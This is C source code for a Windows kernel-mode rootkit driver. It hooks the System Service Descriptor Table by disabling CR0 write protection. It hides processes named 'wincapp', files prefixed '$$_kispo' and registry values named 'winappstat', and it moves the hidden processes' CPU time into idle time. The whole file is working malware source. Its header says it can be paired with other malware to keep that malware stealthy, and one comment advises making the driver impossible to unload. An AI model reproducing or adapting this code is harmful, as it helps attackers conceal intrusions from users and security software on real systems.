// ------------------------------------------------------------------------------------------------
/*  SSDT Windows kernel Rootkit
**  ispo - March 2012
**
**
**  An old school windows kernel mode rootkit. It hides process files and registry keys. It can
**  be used in conjunction with other malware to keep it stealthy.
**
**  Rootkit hooks the System Service Descriptor Table (SSDT), to replace some core functions
**  and filter the results. Rootkit filters and hides:
**
**      [1]. Processes with name: wincapp.exec
**      [2]. Files that start with $$_kispo*
**      [3]. Registry keys with name winappstat
**
**  NOTE: Although driver works fine for Windows XP, Windows Vista, and Windows 7, the file hiding
**  part works properly only for Windows XP.
**
**  COUNTERMEASURES: SSDT hooking is easy to detect by anti-rootkits.
*/
// ------------------------------------------------------------------------------------------------
#include "ntddk.h"                                  // include file

/* define WINDOWS SHELL API data types */
typedef unsigned long int   DWORD;
typedef char                BYTE;
// ------------------------------------------------------------------------------------------------
/* 
**  SERVICE DESCRIPTOR TABLE BASIC DECLARATIONS
*/
#pragma pack(1)                                     /* aling 1 - byte boundary */
typedef struct ServiceDescriptorEntry
{
    DWORD* KiServiceTable;
    DWORD* CounterBaseTable;
    DWORD  nSystemCalls;
    DWORD* KiArgumentTable;
} 
SDE, *PSDE;
#pragma pack()                                      /* end of align */

struct ServiceDescriptorTable {                     // set up the service descriptor table
    SDE ServiceDescriptor[ 4 ];
} SDT;

/* declare a few globals ... */
__declspec(dllimport) SDE KeServiceDescriptorTable;
PVOID *systemCallTable;

// ------------------------------------------------------------------------------------------------
/*
**  disableWP_CR0(): 
**      SSDT resides in read-only section in memory.In order to modify table entries, we need to 
**      disable write protection.
**
**      Because windows uses flat memory model, the privilege level of the code, and the read/write 
**      status of the page being accessed, realized from bit flags in PDEs PTEs and CR0 internal 
**      register.
**          1. R/W flag in PDEs/PTEs: ( 0=read only - 1=read and write )
**          2. U/S flag in PDEs/PTEs: ( 0=kernel mode - 1=user mode )
**          3. The WP(Write Protection) bit in CR0 (17th bit)       
**
**      If WP=1, then access type is determined by the R/W flags of the PDEs and PTEs. Otherwise 
**      Ring-0 privilege permits read and write access.
**
**      All we have to do, in order to disable write protection is to clear the WP bit.
**
**  Return Value: None.
*/
void disableWP_CR0( void ) /* function has no arguments */
{
    // clear WP bit
    // 0xFFFEFFFF = 11111111 11111110 11111111 11111111
    
    __asm                                           /* inline assembly */
    {
        PUSH EBX                                    // store previous value of EBX
        MOV EBX,CR0                                 // get value of CR0
        AND EBX, 0xFFFEFFFF                         // clear 17th bit
        MOV CR0, EBX                                // store modified value back to CR0
        POP EBX                                     // restore value of EBX
    }   
}

// ------------------------------------------------------------------------------------------------
/*
**  enableWP_CR0(): 
**      To avoid problems, we must enable write protection again. To enable protection we enable 
**      the 17th bit from CR0.
**
**  Return Value: None.
*/
void enableWP_CR0( void ) /* function has no arguments */
{
    // set WP bit
    // 0x00010000 = 00000000 00000001 00000000 00000000
    
    __asm   /* inline assembly */
    {
        PUSH EBX                                    // store previous value of EBX
        MOV EBX, CR0                                // get value of CR0
        OR EBX, 0x00010000                          // set 17th bit
        MOV CR0, EBX                                // store modified value back to CR0
        POP EBX                                     // restore value of EBX
    }
}

// ------------------------------------------------------------------------------------------------
/*
**  getSSDTIndex(): 
**      Gets the index number of a system call. The first line of assembly of every System Call, 
**      is in the form: mov eax, xxxH. Thus we ignore the first bit (which is the opcode) and we 
**      read a DWORD, starting from 2nd byte. This is the requested index number.   
**
**  Return Value: The index number of the system call
*/
DWORD getSSDTIndex( 
    BYTE* address                                   // the address of the system call
)
{
    BYTE *addressOfIndex;                           // the address of index number
    DWORD indexValue;                               // the index number of system call
        
    /* 
    ** In order to get the index number of a system call, we look at the 
    ** DWORD following the first byte.  
    */
    addressOfIndex = address + 1;                   // go to the 2nd byte of function
    
    indexValue = *((ULONG*) addressOfIndex);        // read 4 bytes
    
    return indexValue;                              // return the index number of system call
}

// ------------------------------------------------------------------------------------------------
/*
**  NtRoutineAddress():
**      This function retrieves the address of the native routine, specified by the  address 
**      argument. Function is used for debugging.
**  
**  Return Value: The address of the native routine
*/
DWORD NtRoutineAddress( 
    BYTE* address,          // the address of the routine       
    DWORD* kiServiceTable   // pointer to the service table
)
{
    /* get the index number of a system call, specified by address */
    DWORD indexValue = getSSDTIndex( address ); 
    
    /* return the address of native routine */
    return( kiServiceTable[ indexValue ] ); 
}

// ------------------------------------------------------------------------------------------------
/*
**  HookSSDT(): 
**      This function replaces the old pointer in the SSDT, with a pointer to a new hooking 
**      function. The new hooking function used to filter the results.HookSSDT() restores the 
**      oldAddr in the SSDT at the location specified by apiCall.
**
**  Return Value: The pointer to the original function.
*/
BYTE* HookSSDT( 
    BYTE*  apiCall,                                 // address of the (old) function to hook
    BYTE*  oldAddr,                                 // address of the new function to replace
    DWORD* callTable                                // system table to hook
)
{
    DWORD *target;                                  // pointer to the address to replace
    DWORD indexValue = getSSDTIndex( apiCall );     // get the index number of the system call  
         
    /* get the address of the system call in SSDT */
    target = (DWORD*) &( callTable[indexValue] );
    
    /* 
    ** Now, replace the address of the system call with the address of hooking routine. To 
    ** avoid problems, use atomic operation, with the InterlockedExchange function. Return 
    ** the old address of the system call for future unhook.
    */
    return( (BYTE*)InterlockedExchange(target, (DWORD)oldAddr) );
}

// ------------------------------------------------------------------------------------------------
/*
**  unHookSSDT(): 
**      This function is the complement of HookSSDT(). unHookSSD() places newAddr at the location 
**      specified by apiCall and returns the existing address so that we can unhook later on.
**  
**  Return Value: None.
*/
VOID unHookSSDT( 
    BYTE*  apiCall,                                 // address of the hooked function
    BYTE*  newAddr,                                 // address of the hooking function
    DWORD* callTable                                // system table to hook
)
{
    DWORD *target;                                  // pointer to the address to replace
    DWORD indexValue = getSSDTIndex( apiCall );     // get the index number of the system call  
        
    /* get the address of the system call in SSDT */
    target = (DWORD*) &( callTable[indexValue] );
    
    /* Now, restore the hooking function with original system call.  */ 
    InterlockedExchange(target, (DWORD) newAddr);
}
// ------------------------------------------------------------------------------------------------



/**************************************************************************
**                                                                       **
**                      HOOK: ZwQueryDirectoryFile                       **
**                      HIDE: Files & Directories                        ** 
**  WARNING: Files hiding successfully, only undex windows XP.           **
**                                                                       **
**************************************************************************/



// ------------------------------------------------------------------------------------------------
/*
** Original Prototype Function Declaration 
*/
NTSYSAPI
NTSTATUS
NTAPI ZwQueryDirectoryFile
(
    IN  HANDLE                 FileHandle,
    IN  HANDLE                 Event OPTIONAL,
    IN  PIO_APC_ROUTINE        ApcRoutine OPTIONAL,
    IN  void*                  ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK       IoStatusBlock,
    OUT void*                  FileInformation,
    IN  ULONG                  Length, 
    IN  FILE_INFORMATION_CLASS FileInformationClass,
    IN  BOOLEAN                ReturnSingleEntry,
    IN  PUNICODE_STRING        FileName OPTIONAL,
    IN  BOOLEAN                RestartScan
);

// ------------------------------------------------------------------------------------------------
/*
** Declare Original Function Pointer 
*/
typedef NTSTATUS (*ZwQueryDirectoryFilePtr)
(
    IN  HANDLE                 FileHandle,
    IN  HANDLE                 Event OPTIONAL,
    IN  PIO_APC_ROUTINE        ApcRoutine OPTIONAL,
    IN  void*                  ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK       IoStatusBlock,
    OUT void*                  FileInformation,
    IN  ULONG                  Length, 
    IN  FILE_INFORMATION_CLASS FileInformationClass,
    IN  BOOLEAN                ReturnSingleEntry,
    IN  PUNICODE_STRING        FileName OPTIONAL,
    IN  BOOLEAN                RestartScan
);
ZwQueryDirectoryFilePtr oldZwQueryDirectoryFile;    //declare pointer

// ------------------------------------------------------------------------------------------------
/*
** Declare auxiliary data structures 
*/
typedef struct FILE_BOTH_DIR_INFORMATION
{
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    CCHAR         ShortNameLength;
    wchar_t       ShortName[ 12 ] ;
    wchar_t       FileName[ 1 ];
} 
FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

/* declare hidden file name */
wchar_t rkDirName[] = L"$$_kispo"; 

#define RKDIR_NAME_LENGTH 16
#define NO_MORE_ENTRIES 0

// ------------------------------------------------------------------------------------------------
/*
**  newZwQueryDirectoryFile():
**      This function replaces the original ZwQueryDirectoryFile(). newZwQueryDirectoryFile() 
**      calls the original function and then filter the results, by modifying the data that 
**      function returns.
**
**  Return Value: The same as the original ZwQueryDirectoryFile().
*/
NTSTATUS newZwQueryDirectoryFile(
    IN  HANDLE                 FileHandle,
    IN  HANDLE                 Event OPTIONAL,
    IN  PIO_APC_ROUTINE        ApcRoutine OPTIONAL,
    IN  void*                  ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK       IoStatusBlock,
    OUT void*                  FileInformation,
    IN  ULONG                  Length, 
    IN  FILE_INFORMATION_CLASS FileInformationClass,
    IN  BOOLEAN                ReturnSingleEntry,
    IN  PUNICODE_STRING        FileName OPTIONAL,
    IN  BOOLEAN                RestartScan
)
{
    /* local variable declarations */   
    FILE_BOTH_DIR_INFORMATION *currDirectory;       // dir info for current dir
    FILE_BOTH_DIR_INFORMATION *prevDirectory;       // dir info for previous dir
    NTSTATUS ntStatus;                              // the NTSTATUS value to return
    SIZE_T nBytesEqual;                             // the number of equal bytes at comparison
    
    /*
    **  STEP 1: Call the original ZwQueryDirectoryFile().
    */
    ntStatus = oldZwQueryDirectoryFile
    (
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        FileInformation,        
        Length,
        FileInformationClass,
        ReturnSingleEntry,
        FileName,
        RestartScan
    );

    /*
    **  STEP 2: Filter the returning data, scanning for hidden names.
    */  
    if( (!NT_SUCCESS(ntStatus)) || 
        (FileInformationClass != FileBothDirectoryInformation) )    
    {
        /* an error has occured. Don't do anything. */
        return( ntStatus );                         // function failure
    }

    /* initialize directory file information pointers */
    currDirectory = (FILE_BOTH_DIR_INFORMATION*) FileInformation;
    prevDirectory = NULL;
            
    /* 
    ** scan the FileInformation list and search for directories with hidden names.
    */
    do {            
        /* check the name of the current file if it starts with prefix of the hidden name */
        nBytesEqual = RtlCompareMemory
        (
            (void*) &( (*currDirectory).FileName[0] ),
            (void*) &( rkDirName[0] ),
            RKDIR_NAME_LENGTH   
        );

        if( nBytesEqual == RKDIR_NAME_LENGTH )
        {
            /* Hidden name was found! Now, hide the file. */
            if( (*currDirectory).NextEntryOffset != NO_MORE_ENTRIES )
            {
                /* file is not the last element of the list. */
                ULONG delta, nBytes;
                                                
                delta  = ((ULONG)currDirectory) - ((ULONG)FileInformation);                  
                nBytes = (Length - delta) - (*currDirectory).NextEntryOffset;
                                
                RtlCopyMemory(                      // replace modified data.
                    (void*) currDirectory,
                    (void*) ((BYTE*)currDirectory + (*currDirectory).NextEntryOffset),
                    nBytes
                );      
                
                continue;                           // go on
            }
            else /* hidden file is the last element in the list */
            {
                if( currDirectory == (FILE_BOTH_DIR_INFORMATION*)FileInformation ) {
                    ntStatus = STATUS_NO_MORE_FILES;// change return status
                }
                else {                              // change return status
                    (*prevDirectory).NextEntryOffset = NO_MORE_ENTRIES; 
                }
                
                break;
            } 
            
        } 
        
        /* go to the next element in the list. */
        prevDirectory = currDirectory;      
        currDirectory = (FILE_BOTH_DIR_INFORMATION*)
                        (
                            (BYTE*)currDirectory + 
                            (*currDirectory).NextEntryOffset
                        );
                                                            
    } while( (*currDirectory).NextEntryOffset != NO_MORE_ENTRIES );

    return( ntStatus );                             // function success
}
// ------------------------------------------------------------------------------------------------



/**************************************************************************
**                                                                       **
**                  HOOK: ZwQuerySystemInformation                       **
**                  HIDE: Processes                                      ** 
**                                                                       **
**************************************************************************/



// ------------------------------------------------------------------------------------------------
/*
** Original Prototype Function Declaration 
*/
NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation
(
    IN  ULONG   SystemInformationClass,
    IN  void*   SystemInformation,
    IN  ULONG   SystemInformationLength,
    OUT ULONG*  ReturnLength
);

// ------------------------------------------------------------------------------------------------
/*
** Declare Function Pointer 
*/
typedef NTSTATUS (*ZwQuerySystemInformationptr)
(
    IN  ULONG   SystemInformationClass,
    IN  void*   SystemInformation,
    IN  ULONG   SystemInformationLength,
    OUT ULONG*  ReturnLength
);
ZwQuerySystemInformationptr oldZwQuerySystemInformation;

// ------------------------------------------------------------------------------------------------
/* 
**  Additional structures and variables 
*/
typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    //-------------------------------------
    ULONG Reserved[6] ;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ProcessName;
    KPRIORITY BasePriority;
    //-------------------------------------
    void* UniqueProcessId;
    void* Reserved3;
    unsigned long int HandleCount;
    char Reserved4[4] ;
    void* Reserved5[11] ;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved6[6] ;

} 
SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;

// ------------------------------------------------------------------------------------------------
typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFO
{
    LARGE_INTEGER IdleTime;         // time system has been idle, l/leeths of nanosecond
    LARGE_INTEGER KernelTime;       // time system has been in kernel mode, 
                                    // l/leeths of a nanosecond
    LARGE_INTEGER UserTime;         // time system has been i n user mode, 
                                    // l/leeths of a nanosecond
    LARGE_INTEGER Reservedl[2]; 
    ULONG Reserved2;                // reserved.
} 
SYSTEM_PROCESSOR_PERFORMANCE_INFO, *PSYSTEM_PROCESSOR_PERFORMANCE_INFO;

/* information we need it */
#define SystemProcessInformation              5
#define SystemProcessorPerformanceInformation 8
        
LARGE_INTEGER timeHiddenUser;                       // declare timers
LARGE_INTEGER timeHiddenKernel;

wchar_t rkProcName[] = L"wincapp"; 

#define RKPROC_NAME_LENGTH 14

// ------------------------------------------------------------------------------------------------
/*
**  newZwQuerySystemInformation(): 
**      This function replaces the original ZwQuerySystemInformation(). 
**      newZwQuerySystemInformation() calls the original function and then filter the results, by 
**      modifying the data that function returns.
**  
**  Return Value: The same as the original ZwQuerySystemInformation().
*/
NTSTATUS newZwQuerySystemInformation(
    IN  ULONG   SystemInformationClass,
    IN  void*   SystemInformation,
    IN  ULONG   SystemInformationLength,
    OUT ULONG*  ReturnLength
)
{
    /* declare local variables */
    NTSTATUS ntStatus;
    PSYSTEM_PROCESS_INFO cSPI;                      // current  SYSTEM_PROCESS_INFO
    PSYSTEM_PROCESS_INFO pSPI;                      // previous SYSTEM_PROCESS_INFO

    /*
    **  STEP 1: Call the original ZwQuerySystemInformation().
    */
    ntStatus = ((ZwQuerySystemInformationptr) (oldZwQuerySystemInformation) )
    (
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    
    /*
    **  STEP 2: Filter the returning data, scanning for hidden names.
    */  
    if ( !NT_SUCCESS(ntStatus) ) 
    { 
        // an error has occured. Don't do anything.
        return( ntStatus );                         // function failure
    }
    
    /* 
    **  Does the function called for process enumeration ?
    */
    if( SystemInformationClass == SystemProcessorPerformanceInformation )
    {
        /* original function returns process information */
        PSYSTEM_PROCESSOR_PERFORMANCE_INFO timeObject;
        LONGLONG extraTime;
        
        timeObject = (PSYSTEM_PROCESSOR_PERFORMANCE_INFO) SystemInformation;
        
        /* transfer time used by hidden tasks to idle time */
        extraTime = timeHiddenUser.QuadPart + timeHiddenKernel.QuadPart;
        
        (*timeObject).IdleTime.QuadPart = (*timeObject).IdleTime.QuadPart + extraTime;
    }
    
    if( SystemInformationClass != SystemProcessInformation ) { 
        /* we don't need function's return data. */
        return (ntStatus); 
    }
        
    /*
    **  from here on out, we can safely assume that the invoker asked for SystemProcessInfonnation.
    */
    
    /* initialize pointers */
    cSPI = (PSYSTEM_PROCESS_INFO) SystemInformation;
    pSPI = NULL;
    
    /* 
    **  now, traverse the array of SYSTEM_PROCESS_INFO structures until we hit the end.
    */
    while(cSPI != NULL)                             // for each record
    {
        if( (*cSPI).ProcessName.Buffer ==  NULL )
        {
            /* Null process name. System Idle Process (inject hidden task time) */
            (*cSPI).UserTime.QuadPart   = (*cSPI).UserTime.QuadPart 
                                          + timeHiddenUser.QuadPart;
                                          
            (*cSPI).KernelTime.QuadPart = (*cSPI).KernelTime.QuadPart 
                                          + timeHiddenKernel.QuadPart;
            
            timeHiddenUser.QuadPart   = 0;          // clear quads
            timeHiddenKernel.QuadPart = 0;
        }       
        else
        {
            /* compare process name with hidden name */
            if(memcmp( (*cSPI).ProcessName.Buffer, 
                       rkProcName, 
                       RKPROC_NAME_LENGTH) == 0 )
            {
                /* 
                ** We found hidden name. We must hide this process.
                */
                                        
                // first, track time used by hidden process
                timeHiddenUser.QuadPart   = timeHiddenUser.QuadPart 
                                          + (*cSPI).UserTime.QuadPart;
                timeHiddenKernel.QuadPart = timeHiddenKernel.QuadPart 
                                          + (*cSPI).KernelTime.QuadPart;                    
                if(pSPI != NULL)
                {
                    // not the first element in the list
                    if( (*cSPI).NextEntryOffset == 0 )  {
                        (*pSPI).NextEntryOffset=0;  // this is the last element
                    }
                    else {
                        // set next entry offset
                        (*pSPI).NextEntryOffset += (*cSPI).NextEntryOffset;                         
                    }
                }
                else                                // the first element in the list
                {
                    if( (*cSPI).NextEntryOffset == 0) {
                        /* list consists of single hidden entry (set to NULL) */
                        SystemInformation = NULL;
                    }
                    else
                    {
                        /* hidden task is first element (simply increment to hide task) */
                        (BYTE*)SystemInformation =
                            ((BYTE*)SystemInformation) + (*cSPI).NextEntryOffset;
                    }
                }
            }
        }
                
        pSPI = cSPI;                                // update pointers
        
        /* move to the next element in the array (or set to NULL if at last element) */
        if( (*cSPI).NextEntryOffset != 0) { 
            (BYTE*)cSPI = ((BYTE*)cSPI) + (*cSPI).NextEntryOffset;
        }
        else { 
            cSPI = NULL;                            // no more elements
        }
    }
    
    return ntStatus;                                // function success
}
// ------------------------------------------------------------------------------------------------

    
    
/**************************************************************************
**                                                                       **
**                      HOOK: ZwQueryValueKey                            **
**      WARNING: This function does not used in this rootkit. This is    **
**          used ONLY for debugging. Hide names starting with "$$_".     **
**                                                                       **
**************************************************************************/



// ------------------------------------------------------------------------------------------------
/*
** Original Prototype Function Declaration 
*/
NTSYSAPI
NTSTATUS
NTAPI ZwQueryValueKey  
(
    IN  HANDLE                      KeyHandle,
    IN  PUNICODE_STRING             ValueName,
    IN  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID                       KeyValueInformation,
    IN  ULONG                       Length,
    OUT PULONG                      ResultLength
);

// ------------------------------------------------------------------------------------------------
/*
** Declare Function Pointer 
*/
typedef NTSTATUS (*ZwQueryValueKeyptr)
(
    IN  HANDLE                      KeyHandle,
    IN  PUNICODE_STRING             ValueName,
    IN  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID                       KeyValueInformation,
    IN  ULONG                       Length,
    OUT PULONG                      ResultLength
);

ZwQueryValueKeyptr oldZwQueryValueKey;

// ------------------------------------------------------------------------------------------------
/*
**  newZwQueryValueKey(): 
**      This function replaces the original ZwQueryValueKey(). newZwQueryValueKey() calls the 
**      original function and then filter the results, by modifing the data that function returns.
**  
**  Return Value: The same as the original ZwQueryValueKey().
*/
NTSTATUS newZwQueryValueKey(
    IN  HANDLE                      KeyHandle,
    IN  PUNICODE_STRING             ValueName,
    IN  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID                       KeyValueInformation,
    IN  ULONG                       Length,
    OUT PULONG                      ResultLength
)
{
    /* local variable declarations */   
    PSYSTEM_PROCESS_INFO cSPI;                      // current  SYSTEM_PROCESS_INFO
    PSYSTEM_PROCESS_INFO pSPI;                      // previous SYSTEM_PROCESS_INFO
    NTSTATUS ntStatus = 0;  
    
    /*
    **  STEP 1: Call original ZwQueryValueKey().
    */
    ntStatus = ((ZwQueryValueKeyptr) (oldZwQueryValueKey) )
    (
        KeyHandle,
        ValueName,
        KeyValueInformationClass,
        KeyValueInformation,
        Length,
        ResultLength
    );
    
    /*
    **  STEP 2: Filter the returning data, checking for hidden names.
    */  
    if ( !NT_SUCCESS(ntStatus) ) 
    { 
        // an error has occured. Don't do anything.
        return( ntStatus );                         // function failure 
    }
    
    /*
    ** compare the first 3 unicode characters of the key value.
    */
    if( ValueName->Length > 6 ) 
    {       
        if( ValueName->Buffer[0] == '$' &&
            ValueName->Buffer[1] == '$' &&
            ValueName->Buffer[2] == '_' )
    
        {       
            // the process found! alert a message           
            DbgPrint( "I have to hide value: %wZ\n", ValueName );
                        
            return STATUS_INVALID_PARAMETER;        // set up an error message
        }
    }
    
    return ntStatus;                                // function success
}
// ------------------------------------------------------------------------------------------------
    
    

/**************************************************************************
**                                                                       **
**                  HOOK: ZwQuerySystemInformation                       **
**                  HIDE: Registry Values & Keys                         ** 
**                                                                       **
**************************************************************************/


    
// ------------------------------------------------------------------------------------------------     
/* 
**  Original Prototype Function Declaration 
*/
NTSYSAPI
NTSTATUS
NTAPI ZwEnumerateValueKey(
    IN  HANDLE                      KeyHandle,
    IN  ULONG                       Index,
    IN  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID                       KeyValueInformation,
    IN  ULONG                       Length,
    OUT PULONG                      ResultLength
);

// ------------------------------------------------------------------------------------------------     
/*
** Declare Function Pointer 
*/
typedef NTSTATUS (*ZwEnumerateValueKeyptr)
(
    IN  HANDLE                      KeyHandle,
    IN  ULONG                       Index,
    IN  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID                       KeyValueInformation,
    IN  ULONG                       Length,
    OUT PULONG                      ResultLength
);
ZwEnumerateValueKeyptr oldZwEnumerateValueKey;

PCWSTR HideKey = L"winappstat";                     // hidden name

// ------------------------------------------------------------------------------------------------
/*
**  newZwEnumerateValueKey(): 
**      This function replaces the original ZwEnumerateValueKey(). newZwEnumerateValueKey() calls 
**      the original function and then filter the results, by modifing the data that function 
**      returns.
**  
**  Return Value: The same as the original ZwEnumerateValueKey().
*/
NTSTATUS newZwEnumerateValueKey(    
    IN  HANDLE                      KeyHandle,
    IN  ULONG                       Index,
    IN  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID                       KeyValueInformation,
    IN  ULONG                       Length,
    OUT PULONG                      ResultLength
)
{
    /* local variables */
    NTSTATUS ntStatus = 0;
    PSYSTEM_PROCESS_INFO cSPI;                      // current  SYSTEM_PROCESS_INFO
    PSYSTEM_PROCESS_INFO pSPI;                      // previous SYSTEM_PROCESS_INFO
    BOOLEAN bSame;
    PCWSTR KeyNamePtr=NULL;

    /*
    **  STEP 1: Call original ZwEnumerateValueKey().
    */
    ntStatus = ((ZwEnumerateValueKeyptr) (oldZwEnumerateValueKey) )
    (
        KeyHandle,
        Index,
        KeyValueInformationClass,
        KeyValueInformation,
        Length,
        ResultLength
    );
    
    /*
    **  STEP 2: Filter the returning data, checking for hidden names.
    */  
    if ( !NT_SUCCESS(ntStatus) )    
    { 
        // an error has occured. Don't do anything.
        return( ntStatus );                         // function failure 
    }   
    
    // determine the type of KeyValueInformationClass
    switch (KeyValueInformationClass)
    {
        case KeyValueBasicInformation:              // BASIC_INFORMATION
            KeyNamePtr = 
                ((PKEY_VALUE_BASIC_INFORMATION)KeyValueInformation)->Name;
            break;
            
        case KeyValueFullInformation:               // FULL_INFORMATION
            KeyNamePtr = 
                ((PKEY_VALUE_FULL_INFORMATION)KeyValueInformation)->Name;
    }
    
    /* Compare Key Value name with the hidden name */
    if( (KeyNamePtr!=NULL) &&                       // is empty ?
        (wcsstr(KeyNamePtr, HideKey)!=NULL) )       // is equal ?
    {   
        Index++;                                    // increase index
        
        // call the ZwEnumerateValueKey() again to update the arguments
        // with the next Value Key.
        ntStatus = ((ZwEnumerateValueKeyptr)(oldZwEnumerateValueKey))  
        (
            KeyHandle,
            Index,
            KeyValueInformationClass,
            KeyValueInformation,
            Length,
            ResultLength 
        );
    }
    
    return ntStatus;                                // function success!
}
// ------------------------------------------------------------------------------------------------
    


/**************************************************************************
**                                                                       **
**                 MAIN DRIVER LOAD AND UNLOAD ROUTINES                  **
**                                                                       **
**************************************************************************/

    
    
// ------------------------------------------------------------------------------------------------ 
/*
**  Unload(): 
**      Unload driver routine. Replaces the original functions in the SSDT.
**  
**  Return Value: None.
*/
Unload(
    IN PDRIVER_OBJECT DriverObject                  // the driver object
)
{   
    /* disable write protection */
    disableWP_CR0();
            
    // unhook ZwQueryDirectoryFile(), because hooking ZwQueryDirectoryFile() doesn't work
    // for Windows 7.
    /*
        unHookSSDT  
        (   
            (BYTE*)  ZwQueryDirectoryFile,
            (BYTE*)  oldZwQueryDirectoryFile,
            (DWORD*) systemCallTable
        );
    */

    unHookSSDT(                                     // unhook ZwQuerySystemInformation()
        (BYTE*)  ZwQuerySystemInformation,
        (BYTE*)  oldZwQuerySystemInformation,
        (DWORD*) systemCallTable
    );
    
    unHookSSDT(                                     // unhook ZwEnumerateValueKey()
        (BYTE*)  ZwEnumerateValueKey,
        (BYTE*)  oldZwEnumerateValueKey,
        (DWORD*) systemCallTable
    );
                
    /* enable write protection again */
    enableWP_CR0();
    
    DbgPrint("Unload Called. Cleanup complete.\n" );
}

// ------------------------------------------------------------------------------------------------
/*
**  DriverEntry():
**      Main entry point of the kernel mode driver.
**
**  Return Value: If function suceess, the return value is STATUS_SUCCESS. Otherwise, the return 
**      value is the error code.
*/
NTSTATUS DriverEntry(
    IN PDRIVER_OBJECT pDriverObject,                // the driver object
    IN PUNICODE_STRING theRegistryPath              // path in registry for driver
)
{       
    /*
    **  initialize unload routine.
    **
    **  IMPORTANT WARNING:
    **      Setting the Unload routine, the driver can be unloaded. In the final version of the 
    **      rootkit, don't forget to comment the command below. Thus, nobody can unload our driver.
    */
    (*pDriverObject). DriverUnload = Unload;
    
    /* disable write protection */
    disableWP_CR0();
        
    /* initialize address of SSDT */
    systemCallTable = (BYTE*) KeServiceDescriptorTable.KiServiceTable;

    // because hooking ZwQueryDirectoryFile() doesn't work for windows 7
    /*
        oldZwQueryDirectoryFile = 
            (ZwQueryDirectoryFilePtr) HookSSDT(     // hook ZwQueryDirectoryFile()  
                (BYTE*)  ZwQueryDirectoryFile,
                (BYTE*)  newZwQueryDirectoryFile,
                (DWORD*) systemCallTable
            );
    */
        
    oldZwQuerySystemInformation = 
        (ZwQuerySystemInformationptr) HookSSDT(     // hook ZwQuerySystemInformation()
            (BYTE*)  ZwQuerySystemInformation,
            (BYTE*)  newZwQuerySystemInformation,
            (DWORD*) systemCallTable
        );
    

    oldZwEnumerateValueKey = 
        (ZwEnumerateValueKeyptr) HookSSDT(          // hook ZwEnumerateValueKey
            (BYTE*)  ZwEnumerateValueKey,
            (BYTE*)  newZwEnumerateValueKey,
            (DWORD*) systemCallTable
        );      
        
        
    /* enable write protection again */
    enableWP_CR0();
                
    DbgPrint("Kis_L0g Kernel part loaded.\n");
    
    return STATUS_SUCCESS; // function suceess!
    
    // here, the driver terminates its operations, but is still in memory. The driver contains 
    // the hooking functions, so it can be unloaded without unhook the SSDT.
}
// ------------------------------------------------------------------------------------------------
